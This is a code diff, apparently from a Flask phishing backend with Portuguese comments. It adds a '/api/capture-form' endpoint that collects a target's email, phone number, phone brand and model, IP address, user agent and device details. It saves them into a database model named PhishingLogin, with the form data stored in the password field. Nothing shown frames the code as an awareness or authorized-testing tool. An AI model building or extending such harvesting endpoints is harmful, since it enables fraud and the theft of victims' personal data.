@@ -116,6 +116,70 @@ def lookup_ip(ip):
     except Exception as e:
         return jsonify({'error': str(e), 'ip': ip}), 500
 
+@app.route('/api/capture-form', methods=['POST'])
+def capture_form():
+    """Captura dados adicionais fornecidos pelo usuário (número, marca, etc)."""
+    try:
+        data = request.get_json(force=True, silent=True) or {}
+        
+        email = data.get('email', '').strip()
+        if not email:
+            return jsonify({'error': 'Email é obrigatório'}), 400
+        
+        # Capturar IP
+        client_ip = data.get('client_ip')
+        if client_ip and client_ip != 'unknown':
+            ip = client_ip
+        else:
+            ip = get_client_ip()
+        
+        # Dados do formulário
+        phone_number = data.get('phone_number', '').strip()
+        phone_brand = data.get('phone_brand', '').strip()
+        phone_model = data.get('phone_model', '').strip()
+        
+        # Device info do cliente (se enviado)
+        client_device = data.get('device_info', {})
+        
+        # Combinar tudo
+        user_agent = request.headers.get('User-Agent', '')
+        
+        # Construir o device_info completo
+        full_info = {
+            'source': 'checklist_form',
+            'phone_number': phone_number,
+            'phone_brand': phone_brand,
+            'phone_model': phone_model,
+            'form_data': data
+        }
+        
+        if client_device and isinstance(client_device, dict):
+            full_info['client_device'] = client_device
+        
+        timestamp = datetime.utcnow()
+        
+        with db_lock:
+            entry = PhishingLogin(
+                email=email,
+                password=f'[FORM] {phone_brand} {phone_model} - {phone_number}',
+                ip=ip,
+                user_agent=user_agent,
+                device_info=str(full_info),
+                timestamp=timestamp
+            )
+            db.session.add(entry)
+            db.session.commit()
+        
+        return jsonify({
+            'success': True,
+            'message': 'Dados capturados com sucesso',
+            'id': entry.id
+        }), 200
+    
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({'error': str(e)}), 500
+
 def get_client_ip():
     ip = (
         request.headers.get('CF-Connecting-IP') or
